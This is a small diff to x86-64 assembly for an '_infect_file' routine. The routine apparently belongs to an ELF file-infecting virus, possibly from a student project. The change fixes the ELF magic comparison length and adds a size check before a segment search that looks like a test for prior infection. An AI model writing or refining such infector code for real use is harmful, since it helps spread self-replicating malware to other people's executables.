@@ -361,7 +361,7 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
-	push 4
+	push 5
 	pop rdx
 	call _ft_memcmp
 	push rsi
@@ -407,6 +407,8 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, [rbx + 8]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + 32]; p_filesz
+			cmp rsi, rdx
+			jl .unmap
 			call _ft_memmem
 			cmp rax, 0x0
 			jne .unmap
